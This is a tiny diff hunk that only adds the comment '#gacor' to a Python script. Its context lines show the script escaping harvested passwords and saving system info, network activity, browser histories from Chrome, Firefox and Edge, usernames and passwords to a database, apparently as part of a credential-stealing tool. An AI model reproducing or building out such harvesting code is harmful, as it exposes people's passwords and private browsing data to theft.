@@ -303,3 +303,4 @@ if __name__ == "__main__":
     passwords = escape_percent(passwords)
 
     save_to_database(system_info, net_activity, chrome_history, firefox_history, edge_history, url, usernames, passwords)
+#gacor
